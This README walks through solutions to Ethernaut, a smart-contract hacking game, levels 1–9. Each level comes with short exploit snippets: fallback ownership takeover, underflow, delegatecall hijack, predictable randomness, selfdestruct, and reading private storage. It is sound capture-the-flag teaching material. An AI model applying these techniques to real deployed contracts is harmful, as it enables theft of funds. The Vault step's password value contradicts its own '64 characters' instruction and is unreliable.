# Hackernaut 🧑‍🚀
Set of smart contracts and documentation for hacking the OpenZeppelin [Ethernaut game](https://ethernaut.openzeppelin.com/)
> **Note**: Not all the levels can be solved by creating a smart contract.
> This repository contains the contracts that solve the levels that **require** a smart contract to be solved and some steps to hack the rest of them.

Happy hacking! 😄

## Smart Contracts setup

1. Create an [Alchemy](https://www.alchemy.com/) account.
2. Create a testing Rinkeby testnet account and feed it with some RinkebyETH using the [Alchemy Faucet](https://rinkebyfaucet.com/).
3. Create a `.env` file on the root folder containing the following variables

```shell
VICTIM_ADDRESS= # Address of the current contract you want to hack
ALCHEMY_API_KEY= # Your Alchemy API Key
RINKEBY_PRIVATE_KEY= # Private key from the Rinkeby testnet account
```

## Scripts
Before hacking each level you must setup the `VICTIM_ADDRESS` env variable previously mentioned. Then, you must run the yarn deploy script according to the level:

```shell
yarn deploy -- <level_name>
```
After this, you must harcode the contract address in the respective script by overriding the `contractAddress` variable. Once done, run the following:

```shell
yarn start:<level_name>
```

## Solutions

### 1. Hello Ethernaut
Just follow the steps and you'll get there.

---

### 2. Fallback
This level requires 2 steps to complete as described:

>You will beat this level if
>1. you claim ownership of the contract
>2. you reduce its balance to 0

#### Claiming the ownership
The trick here is to use the fallback `receive` function to get the ownership of the contract.

```sol
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```
In order to archieve this, we must statisfy 2 conditions: `msg.value` must be greater than zero and our account must have contributed.

So before calling the fallback `receive` function, we need to make a contribution to the contract. We can do so as follows:

```js
await contract.contribute({ value: 1 });
```
You can also check that the contribution was successful by calling the following line

```js
await contract.contributions(player).then(Number);
```
if the number is greater than zero, then you did it.

Now we can claim the ownership of the contract calling the fallback `receive` function. In order to call fallback payable functions, we just have to send a regular transaction to the contract address as follows:

```js
await contract.sendTransaction({ value: 1 })
```
Now if the transaction was successful, we must be the new owners of this contract, let's check that.

```js
await contract.owner().then(owner => owner === player);
```
#### Reducing the balance to 0
The way to reduce the balance to 0 is by using the `withdraw` function, which sends all the current balance to the owner.

```sol
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

We are the owners of the contract, let's take those coins!

```js
await contract.withdraw();
```
---

### 3. Fallout

In this contract there is a typo (not very visible due to the text font) in the 'constructor' function. Wich means that its name does not match with the contract name.

```sol
contract Fallout {

  //...

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

Therefore this is just a regular public function that can be called by anyone.

```js
await contract.Fal1out({ value: 1 });
```

then you can check the ownership of the contract

```js
await contract.owner().then(owner => owner === player);
```

And we are done!

---

### 4. Coin Flip
On this level we are going to exploit the pseudo-randomness of smart contracts.

```sol
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

Turns out that the `blockValue` is totally deterministic for a given block, which means that we can replicate this value using another smart contract and calling the function `guess` from there.

The code of the smart contract is [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/CoinFlip.sol).

As a summary, the following function will guess the coin side successfully in every single try:

```sol
function guess() public {
  uint256 blockValue = uint256(blockhash(block.number - 1));
  uint256 coinFlip = blockValue / FACTOR;
  bool myGuess = coinFlip == 1 ? true : false;
  CoinFlipInterface(victimAddress).flip(myGuess);
}
```
Then you just have to call your `guess` function 10 times.

---

### 5. Telephone

The `msg.sender` is the address of the function caller (can be whether an ethereum account address or an smart contract address), and the `tx.origin` is the address of the account that originated the transaction.

```sol
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

This means that we can satisfy the condition `(tx.origin != msg.sender)` by setting up a contract between our account call and the contract call.

[Here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Telephone.sol) is the code of the contract we are going to use, you just have to deploy it and call `claimOwnership` function.

---

### 6. Token

Here we can hack the contract by exploiting the `uint` data type design. Since it is unsigned by definition, we cannot convert it into a negative number, then the `require` statement will always be satisfied no matter what positive value we send on the `_value` parameter.

```sol
  require(balances[msg.sender] - _value >= 0);
```

Then if we substract a greater uint number from a uint we will produce an arithmetic underflow.

```sol
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

So we can simply send the following transaction and after that, our balance should be something like `1.157920892373162e+77`.

```js
await contract.transfer('<some_random_address>', 21);
```

Check your balance after the transaction:

```js
await contract.balanceOf(player).then(Number);
```
---

### 7. Delegation

One important property of `delegatecall` is that executes other contractact's code in the context of the current contract.

Which means that we can claim the ownership of `Delegation` contract using the `pwn` function of the `Delegate` one.

```sol
function pwn() public {
  owner = msg.sender;
}
```
In order to do so, we need to invoke the `fallback` function of the `Delegation` contract, sending on `msg.data` the encoded name of function we want to delegate (in this case `pwn()`).

But first we need to encode the `pwn` function name in order to make it work. You can use [this online encoder](https://abi.hashex.org/) to get the right encoded name. As a result we get the following code: `dd365b8b`.

```JS
contract.sendTransaction({ data: 'dd365b8b' });
```

And that's it! now let's check if works:

```JS
await contract.owner().then(owner => owner === player);
```

---

### 8. Force

Though the standard way to send ether to a Smart Contract is by using some `payable` function (such as the `receive` function), you can force any contract to receive ether in different ways.

One way is by creating another contract that calls the `selfdestruct` keyword targeting to the contract we want to pay (setting the victim contract address as a parameter).

```sol
function takeMyMoney() public payable {
  // self destructs the contract
  // targeting to the victim contract
  // in order to force its balance to increase.
  selfdestruct(victimAddress);
}
```

Then we can deploy [this contract](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Force.sol), instance it in a variable like `yourContract`, and then send some ether as follows:

```js
await yourContract.sendTransaction({ value: 1 });
```

And finally self-destroy it calling `takeMyMoney` function pointing to the instance contract address:

```js
await yourContract.takeMyMoney();
```

---

### 9. Vault

The `private` keyword does not mean that the value of that variable is not visible by anyone. By design, the state of the blockchain is completely visible globally. Which means that by doing some research we can get the value of the `password` variable on-chain.

#### Solution #1
One way to get that value is by browsing [Etherscan](https://rinkeby.etherscan.io/) and searching by the hash of the contract created.

![Vault screenshot](/docs/vault1.png?raw=true)

Go the the `Contract` tab, and under the` Contract Creation Code` section you will see the encoded information (bytecode) that represents the data of the `contructor` call with its parameters.

![Vault screenshot 2](/docs/vault2.png?raw=true)

The bytecode is the hexadecimal representation of the Solidity code, remember that a byte is a set of 8 bits and a single hex is represented by 4 bits (`2^4 = 16`). So that means that a byte in this hexadecimal representation is composed by 2 characters (`4 bits + 4 bits = 8 bits = 1 byte`)

Since the `password` variable is bytes32 (`8 bits (byte) * 32 = 4 bits (hex) * 64`). So we must take the last 64 characters of the code, in this case `41ed2f1d39cad24fdf2b1c64736f6c63430006030033412076657279207374726f6e67207365637265742070617373776f7264203a29`.

The way to send an hexadecimal value to the contract as a parameter is by adding a `0x` prefix:

```js
await contract.unlock('0x41ed2f1d39cad24fdf2b1c64736f6c63430006030033412076657279207374726f6e67207365637265742070617373776f7264203a29');
```
Then we can check if the contract was unlocked

```js
await contract.locked();
```

#### Solution #2

There is also a much simpler way (but much less fun), this is just reading the first slot storage using the handy `getStorageAt` function of the web3 library:

```js
const password = await web3.eth.getStorageAt(contract.address, 1);
```

And then:

```js
contract.unlock(password);
```

Finally we can check if the contract was unlocked

```js
await contract.locked();
```